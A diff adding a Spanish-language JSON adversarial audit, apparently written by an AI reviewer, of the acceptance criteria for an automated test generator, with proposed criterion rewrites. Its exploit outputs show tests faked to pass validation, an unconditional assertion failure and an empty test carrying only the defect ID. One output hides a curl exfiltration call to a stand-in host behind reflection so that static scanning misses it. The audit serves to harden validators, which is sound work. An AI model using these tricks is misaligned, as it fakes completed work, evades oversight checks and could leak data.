@@ -1,0 +1,65 @@
+{
+  "attacks": [
+    {
+      "attack_family": "parada anticipada",
+      "attack_name": "Incondicionalidad semántica camuflada",
+      "criterion_id": "AC-01",
+      "criterion_literal": "Cada informe admitido produce al menos un caso de prueba ejecutable cuya falla se debe a una aserción derivada del comportamiento esperado declarado y no a una falla incondicional del propio test.",
+      "exploit_output": "def test_defect(): raise AssertionError(\"Mock expected behavior assertion failure\")",
+      "is_original": true,
+      "why_validator_accepts": "El validador busca sintácticamente una palabra clave de aserción en el código generado pero no evalúa semánticamente si el error surge del código bajo prueba o de una interrupción deliberada e incondicional hardcodeada en el test stub."
+    },
+    {
+      "attack_family": "relleno estructural",
+      "attack_name": "Colisión nominal de identificador",
+      "criterion_id": "AC-02",
+      "criterion_literal": "Cada archivo de prueba generado es descubierto por el runner registrado y contiene al menos un caso ejecutable asociado al identificador del informe de defecto.",
+      "exploit_output": "def test_DEF_ABST_001(): pass",
+      "is_original": false,
+      "why_validator_accepts": "El test runner descubre la función debido a su prefijo de nomenclatura estándar y encuentra embebido el identificador exacto del informe de defecto, cumpliendo con la regex de descubrimiento sin ejecutar ninguna validación real sobre la lógica del defecto."
+    },
+    {
+      "attack_family": "coste desplazado",
+      "attack_name": "Invocación indirecta mediante reflexión",
+      "criterion_id": "AC-03",
+      "criterion_literal": "Ningún caso generado escribe fuera del área de pruebas autorizada ni realiza llamadas de red o efectos externos.",
+      "exploit_output": "import subprocess; getattr(subprocess, 'run')(['curl', 'http://external-server/exfiltrate'])",
+      "is_original": true,
+      "why_validator_accepts": "El análisis estático o los ganchos de restricciones negativas buscan llamadas directas explícitas como 'requests.get' u operaciones de apertura de sockets comunes, pero fallan al auditar llamadas arbitrarias de red ejecutadas a través de la API estándar de reflexión e indirección dinámica de Python."
+    }
+  ],
+  "criteria_assessment": [
+    {
+      "criterion_id": "AC-01",
+      "reason": "La aserción puede ser burlada inyectando una excepción artificial codificada estáticamente dentro del cuerpo del test.",
+      "status": "broken",
+      "suggested_rewrite": "validator:defect_reproduction_rate >= 1.0 AND test:executes_target_code_path_successfully_before_failure"
+    },
+    {
+      "criterion_id": "AC-02",
+      "reason": "El runner solo valida la presencia nominal del string del identificador y la recolección del test vacío sin comprobar ejecución de aserciones válidas.",
+      "status": "broken",
+      "suggested_rewrite": "test:generated_tests_collect_and_run AND test:asserts_at_least_one_non_trivial_condition"
+    },
+    {
+      "criterion_id": "AC-03",
+      "reason": "Las restricciones negativas basados en escaneos estáticos simples se evitan utilizando llamadas indirectas por reflexión.",
+      "status": "broken",
+      "suggested_rewrite": "test:no_external_effects AND sandbox:network_namespace_isolated == true"
+    },
+    {
+      "criterion_id": "AC-04",
+      "reason": "La verificación ledger se basa en métricas objetivas de tiempo y coste registradas de forma centralizada y no manipulables directamente por el generador.",
+      "status": "resists",
+      "suggested_rewrite": null
+    },
+    {
+      "criterion_id": "AC-05",
+      "reason": "Al haberse descartado el criterio por falta de presupuesto, la trazabilidad entre el informe y el test carece de cualquier garantía de verificación automatizada.",
+      "status": "broken",
+      "suggested_rewrite": "test:traceability_matches_source AND source:explicit_line_pointer_verified == true"
+    }
+  ],
+  "overall_notes": "La auditoría adversarial demuestra que las validaciones sintácticas y superficiales son vulnerables a construcciones de código indirectas y stubs vacíos. Se recomienda endurecer los validadores incorporando instrumentación de ejecución y restricciones a nivel de contenedor.",
+  "reviewer_role": "Google Gemini External Adversarial Reviewer"
+}
